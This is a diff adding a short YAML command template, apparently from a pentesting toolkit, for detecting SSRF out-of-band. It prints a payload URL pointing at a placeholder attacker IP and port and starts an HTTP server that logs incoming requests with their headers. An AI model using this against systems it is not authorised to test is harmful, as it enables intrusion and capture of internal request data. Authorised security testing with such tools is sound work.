@@ -1,0 +1,12 @@
+---
+metadata:
+  filename: "capture-http-ssrf-out-of-band-responses-including-headers.yaml"
+  tags: ["web"]
+  created: "2025-04-10"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; \
+  echo 'Possible payload to enter: http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/non-existent-path'; \
+  echo '================================================================'; \
+  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound --show-headers
